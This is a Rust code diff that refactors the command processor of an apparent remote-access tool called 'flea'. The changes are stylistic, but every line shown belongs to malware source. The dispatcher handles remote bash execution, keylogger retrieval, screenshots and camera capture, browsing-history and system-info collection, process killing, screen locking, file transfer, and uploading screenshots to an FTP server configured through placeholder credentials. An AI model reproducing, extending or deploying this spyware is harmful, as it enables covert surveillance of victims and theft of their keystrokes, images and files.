@@ -15,37 +15,37 @@ use crate::camera;
 use crate::keylogger::*;
 
 const FLEA_PROTOCOL_VERSION: u8 = 1;
-const GET_VERSION_COMMAND: &'static str = "version";
-const EXECUTE_BASH_COMMAND: &'static str = "bash";
-const SEND_PIC_COMMAND: &'static str = "ftpscreenshot";
-const GET_SCREENSHOT_COMMAND: &'static str = "screenshot";
-const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "log";
-const SEND_PROCESS_LIST_COMMAND: &'static str = "proclist";
-const KILL_COMMAND: &'static str = "kill";
-const UPLOAD_COMMAND: &'static str = "upload";
-const DIR_COMMAND: &'static str = "dir";
-const GET_FILE_COMMAND: &'static str = "getfile";
-const CHANGE_DIRECTORY_COMMAND: &'static str = "cd";
-const FTP_PARAM_COMMAND: &'static str = "setftp";
-const BROWSING_HISTORY_COMMAND: &'static str = "history";
-const GET_SYSTEM_INFO_COMMAND: &'static str = "sysinfo";
-const GET_WORKING_DIR_COMMAND: &'static str = "pwd";
-const RESTART_COMMAND: &'static str = "restart";
-const LOCK_SCREEN_COMMAND: &'static str = "lockscreen";
-pub const STOP_COMMAND: &'static str = "quit";
-const UNKNOWN_COMMAND: &'static str = "Unknown command";
+const GET_VERSION_COMMAND: &str = "version";
+const EXECUTE_BASH_COMMAND: &str = "bash";
+const SEND_PIC_COMMAND: &str = "ftpscreenshot";
+const GET_SCREENSHOT_COMMAND: &str = "screenshot";
+const SEND_KEY_LOGGER_FILE_COMMAND: &str = "log";
+const SEND_PROCESS_LIST_COMMAND: &str = "proclist";
+const KILL_COMMAND: &str = "kill";
+const UPLOAD_COMMAND: &str = "upload";
+const DIR_COMMAND: &str = "dir";
+const GET_FILE_COMMAND: &str = "getfile";
+const CHANGE_DIRECTORY_COMMAND: &str = "cd";
+const FTP_PARAM_COMMAND: &str = "setftp";
+const BROWSING_HISTORY_COMMAND: &str = "history";
+const GET_SYSTEM_INFO_COMMAND: &str = "sysinfo";
+const GET_WORKING_DIR_COMMAND: &str = "pwd";
+const RESTART_COMMAND: &str = "restart";
+const LOCK_SCREEN_COMMAND: &str = "lockscreen";
+pub const STOP_COMMAND: &str = "quit";
+const UNKNOWN_COMMAND: &str = "Unknown command";
 
-pub const RESTART_FILENAME: &'static str = "flea.rst";
+pub const RESTART_FILENAME: &str = "flea.rst";
 
 #[cfg(feature = "camera")]
-const GET_CAMERA_FRAME_COMMAND: &'static str = "camera";
+const GET_CAMERA_FRAME_COMMAND: &str = "camera";
 
 
 //Enter your data for FTP Server connection
-const FTP_USER_NAME: &'static str = "enter_ftp_user_name";
-const FTP_PASS_NAME: &'static str = "enter_ftp_user_password";
-const FTP_ADDRESS_NAME: &'static str = "enter_ftp_server_ip_address";
-const FTP_FOLDER_NAME: &'static str = "Files";
+const FTP_USER_NAME: &str = "enter_ftp_user_name";
+const FTP_PASS_NAME: &str = "enter_ftp_user_password";
+const FTP_ADDRESS_NAME: &str = "enter_ftp_server_ip_address";
+const FTP_FOLDER_NAME: &str = "Files";
 
 pub trait FleaCommand
 {
@@ -141,16 +141,16 @@ impl CommandProcessor
                 Ok(_) =>
                 {
                     debug!("Directory changed");
-                    return "Directory changed".to_string();
+                    "Directory changed".to_string()
                 },
                 Err(x) =>
                 {
                     error!("Error: {}", x);
-                    return x.to_string();
+                    x
                 }
             }
         }
-        else if value.len() == 0
+        else if value.is_empty()
         {
             debug!("Directory name is empty");
             return "Directory name is empty".to_string();
@@ -167,7 +167,7 @@ impl CommandProcessor
                 Err(x) =>
                 {
                     error!("Error: {}", x);
-                    return x.to_string();
+                    return x;
                 }
             }
         }
@@ -175,7 +175,7 @@ impl CommandProcessor
 
     fn set_ftp_params(&mut self, value: &str) -> String
     {
-        let ftp_params: Vec<&str> = value.split(";").collect();
+        let ftp_params: Vec<&str> = value.split(';').collect();
         if ftp_params.len() != 3
         {
             return "Wrong number of parameters".to_string();
@@ -190,11 +190,11 @@ impl CommandProcessor
         {
             Ok(_) =>
             {
-                return "Ok".to_string();
+                "Ok".to_string()
             },
             Err(x) =>
             {
-                return x.to_string();
+                x.to_string()
             }
         }
     }
@@ -284,7 +284,7 @@ impl FleaCommand for CommandProcessor
             },
             Err(y) =>
             {
-                panic!("Couldn't get current directory: {}", y.to_string())
+                panic!("Couldn't get current directory: {}", y)
             }
         };
 
@@ -300,12 +300,12 @@ impl FleaCommand for CommandProcessor
                 },
                 Err(e) =>
                 {
-                    panic!("Configuration error {}", e.to_string())
+                    panic!("Configuration error {}", e)
                 }
             },
             
             current_directory: cr.clone(),
-            ftp: FTP::new(cr.clone()),
+            ftp: FTP::new(cr),
             screenshot: Screenshot::new(),
             os: SystemCmd::new(),
         }
@@ -334,17 +334,17 @@ impl FleaCommand for CommandProcessor
         {
             GET_VERSION_COMMAND =>
             {
-                return self.version.to_string();
+                self.version.to_string()
             },
 
             EXECUTE_BASH_COMMAND =>
             {
-                return self.os.execute_bash_command(value);
+                self.os.execute_bash_command(value)
             },
 
             KILL_COMMAND =>
             {
-                return self.os.kill_process(value)
+                self.os.kill_process(value)
             },
 
             UPLOAD_COMMAND =>
@@ -353,11 +353,11 @@ impl FleaCommand for CommandProcessor
                 {
                     Ok(_) =>
                     {
-                        return "File uploaded".to_string();
+                        "File uploaded".to_string()
                     },
                     Err(x) =>
                     {
-                        return x.to_string();
+                        x.to_string()
                     }
                 }
             },
@@ -365,17 +365,17 @@ impl FleaCommand for CommandProcessor
             SEND_KEY_LOGGER_FILE_COMMAND =>
             {
                 let current_path = self.current_directory.join(KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
-                return get_key_logger_content(&current_path);
+                get_key_logger_content(&current_path)
             },
 
             SEND_PROCESS_LIST_COMMAND =>
             {
-                return self.os.get_process_list();
+                self.os.get_process_list()
             },
 
             CHANGE_DIRECTORY_COMMAND =>
             {
-                return self.change_directory(value, file_server);
+                self.change_directory(value, file_server)
             },
 
             DIR_COMMAND =>
@@ -383,12 +383,12 @@ impl FleaCommand for CommandProcessor
                 if let Ok(files) = file_server.lock().unwrap().list_content()
                 {
                     debug!("Directory content returned");
-                    return self.vec_to_string(&files);
+                    self.vec_to_string(&files)
                 }
                 else 
                 {
                     debug!("Couldn't get files");
-                    return "Couldn't get files".to_string();
+                    "Couldn't get files".to_string()
                 }
             },
 
@@ -404,7 +404,7 @@ impl FleaCommand for CommandProcessor
                     Err(x) =>
                     {
                         error!("Error: {}", x);
-                        return x.to_string()
+                        x.to_string()
                     }
                 }
             },
@@ -412,7 +412,7 @@ impl FleaCommand for CommandProcessor
             GET_SCREENSHOT_COMMAND =>
             {
                 let current_path = self.get_temp_dir();
-                match self.screenshot.take_screenshot(&current_path.to_str().unwrap()) 
+                match self.screenshot.take_screenshot(current_path.to_str().unwrap()) 
                 {
                     Ok(x) =>
                     {
@@ -449,7 +449,7 @@ impl FleaCommand for CommandProcessor
             SEND_PIC_COMMAND =>
             {
                 let current_path = self.get_temp_dir();
-                match self.screenshot.take_screenshot(&current_path.to_str().unwrap()) 
+                match self.screenshot.take_screenshot(current_path.to_str().unwrap()) 
                 {
                     Ok(x) =>
                     {
@@ -461,7 +461,7 @@ impl FleaCommand for CommandProcessor
                     }
                 };
 
-                return match self.ftp.send_file_to_ftp(&self.conf.ftp_address, &self.conf.ftp_user, 
+                match self.ftp.send_file_to_ftp(&self.conf.ftp_address, &self.conf.ftp_user, 
                     &self.conf.ftp_pass, &current_path, &self.conf.ftp_folder)
                 {
                     Ok(_) =>
@@ -489,7 +489,7 @@ impl FleaCommand for CommandProcessor
 
             FTP_PARAM_COMMAND =>
             {
-                return self.set_ftp_params(value);
+                self.set_ftp_params(value)
             },
             
             BROWSING_HISTORY_COMMAND =>
@@ -498,11 +498,11 @@ impl FleaCommand for CommandProcessor
                 {
                     Ok(x) =>
                     {
-                        return self.vec_to_string(&x);
+                        self.vec_to_string(&x)
                     },
                     Err(x) =>
                     {
-                        return x.to_string();
+                        x.to_string()
                     }
                 }
             },
@@ -510,23 +510,23 @@ impl FleaCommand for CommandProcessor
             #[cfg(feature = "camera")]
             GET_CAMERA_FRAME_COMMAND =>
             {
-                return self.get_camera_frame(file_server);
+                self.get_camera_frame(file_server)
             },
 
             GET_SYSTEM_INFO_COMMAND =>
             {
-                return self.os.get_system_info();
+                self.os.get_system_info()
             },
             
             GET_WORKING_DIR_COMMAND =>
             {
-                return file_server.lock().unwrap().get_dir();
+                file_server.lock().unwrap().get_dir()
             },
 
             LOCK_SCREEN_COMMAND =>
             {
                 self.os.lock_screen();
-                return "Ok".to_string();
+                "Ok".to_string()
             },
 
             RESTART_COMMAND =>
@@ -536,24 +536,24 @@ impl FleaCommand for CommandProcessor
                     Ok(_) =>
                     {
                         debug!("Restart file created");
-                        return STOP_COMMAND.to_string();
+                        STOP_COMMAND.to_string()
                     },
                     Err(x) =>
                     {
                         error!("Error: {}", x);
-                        return x.to_string();
+                        x
                     }
                 }
             },
 
             STOP_COMMAND =>
             {
-                return STOP_COMMAND.to_string();
+                STOP_COMMAND.to_string()
             },
 
             &_ =>
             {                
-                return UNKNOWN_COMMAND.to_string();
+                UNKNOWN_COMMAND.to_string()
             }
         }
     }
